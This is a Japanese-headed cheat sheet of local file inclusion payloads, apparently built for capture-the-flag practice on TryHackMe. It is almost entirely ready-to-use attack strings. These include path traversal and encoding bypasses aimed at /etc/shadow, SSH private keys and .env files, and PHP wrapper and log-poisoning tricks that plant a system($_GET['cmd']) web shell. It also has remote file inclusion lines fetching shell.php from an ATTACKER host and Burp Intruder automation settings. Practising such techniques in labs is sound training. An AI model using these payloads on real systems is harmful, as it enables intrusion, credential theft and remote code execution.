
## 1. 基本トラバーサル

```
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
../../../../../../../../../etc/passwd
../../../../../../../../../../etc/passwd
```

---

## 2. NULLバイト (.php除去) PHP < 5.3.4

```
../../../../etc/passwd%00
../../../../../etc/passwd%00
../../../../../../etc/passwd%00
../../../../etc/shadow%00
../../../../etc/hosts%00
../../../../etc/hostname%00
../../../../home/www-data/.ssh/id_rsa%00
../../../../root/.ssh/id_rsa%00
../../../../root/.bash_history%00
../../../../var/www/html/config.php%00
../../../../var/www/html/.env%00
```

---

## 3. ../ フィルターバイパス

### ....// パターン
```
....//etc/passwd
....//....//etc/passwd
....//....//....//etc/passwd
....//....//....//....//etc/passwd
....//....//....//....//....//etc/passwd
....//....//....//....//....//....//etc/passwd
```

### ..././ パターン
```
..././etc/passwd
..././..././etc/passwd
..././..././..././etc/passwd
..././..././..././..././etc/passwd
..././..././..././..././..././etc/passwd
```

### URLエンコード
```
..%2Fetc%2Fpasswd
..%2F..%2Fetc%2Fpasswd
..%2F..%2F..%2Fetc%2Fpasswd
..%2F..%2F..%2F..%2Fetc%2Fpasswd
..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
```

### ダブルエンコード
```
..%252Fetc%252Fpasswd
..%252F..%252Fetc%252Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd
..%252F..%252F..%252F..%252Fetc%252Fpasswd
..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd
```

---

## 4. PHP ラッパー

### php://filter (ソースコード取得)
```
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=../config.php
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/convert.base64-encode/resource=/etc/shadow
php://filter/read=string.rot13/resource=index.php
php://filter/read=string.rot13/resource=config.php
```

### php://input (POSTでRCE)
```
GET /page.php?file=php://input HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

<?php system($_GET['cmd']); ?>
```

### data://
```
data://text/plain,<?php echo shell_exec('id'); ?>
data://text/plain,<?php echo shell_exec('hostname'); ?>
data://text/plain,<?php echo shell_exec('whoami'); ?>
data://text/plain,<?php echo shell_exec('cat /etc/passwd'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

### expect://
```
expect://id
expect://whoami
expect://hostname
expect://cat /etc/passwd
```

---

## 5. Log Poisoning

### Step 1: User-AgentにPHPコードを注入

```
GET / HTTP/1.1
Host: TARGET
User-Agent: <?php system($_GET['cmd']); ?>
```

### Step 2: ログをLFIで読む + cmd実行

```
../../../../var/log/apache2/access.log&cmd=id
../../../../var/log/apache2/access.log&cmd=whoami
../../../../var/log/apache2/access.log&cmd=hostname
../../../../var/log/apache2/access.log&cmd=cat+/etc/passwd
../../../../var/log/nginx/access.log&cmd=id
../../../../proc/self/environ&cmd=id
```

---

## 6. RFI ペイロード

```
http://ATTACKER:8888/shell.php
http://ATTACKER:8888/shell.php%00
http://ATTACKER:8888/shell.php%26cmd=id
http://ATTACKER:8888/shell.php%26cmd=whoami
http://ATTACKER:8888/shell.php%26cmd=hostname
http://ATTACKER:8888/shell.php%26cmd=cat+/etc/passwd
\\ATTACKER\share\shell.php
```

---

## 7. Cookie経由 ($ _REQUEST利用アプリ)

Cookieを書き換える:

```
Cookie: file=../../../../etc/passwd
Cookie: file=../../../../etc/passwd%00
Cookie: file=../../../../etc/shadow%00
Cookie: file=../../../../root/.ssh/id_rsa%00
Cookie: file=../../../../var/www/html/config.php%00
Cookie: THM=../../../../etc/passwd%00
Cookie: THM=../../../../etc/flag%00
Cookie: THM=../../../../../etc/flag%00
```

---

## 8. POST経由 ($ _REQUEST利用アプリ)

メソッドをPOSTに変えてBodyに入れる:

```
POST /page.php HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded

file=../../../../etc/passwd
file=../../../../etc/passwd%00
file=../../../../etc/shadow%00
file=../../../../root/.ssh/id_rsa%00
file=../../../../var/www/html/config.php%00
file=../../../../../etc/flag%00
```

---

## 9. よく使うターゲットファイル

```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/crontab
/etc/ssh/sshd_config
/root/.bash_history
/root/.ssh/id_rsa
/home/www-data/.ssh/id_rsa
/var/www/html/config.php
/var/www/html/.env
/var/www/html/index.php
/var/www/html/db.php
/proc/self/environ
/proc/version
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log
/tmp/flag
/etc/flag
/etc/flag1
/etc/flag2
/etc/flag3
/root/flag.txt
/home/user/flag.txt
```

---

## 10. Intruder 設定 (自動化)

```
GET /page.php?file=§PAYLOAD§ HTTP/1.1
Host: TARGET
```

ペイロードリスト: SecLists の LFI リストを使う
```
/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
```

Grep — Match で成功判定:
```
root:x:0:0
/bin/bash
/bin/sh
THM{
FLAG{
flag{
```

---
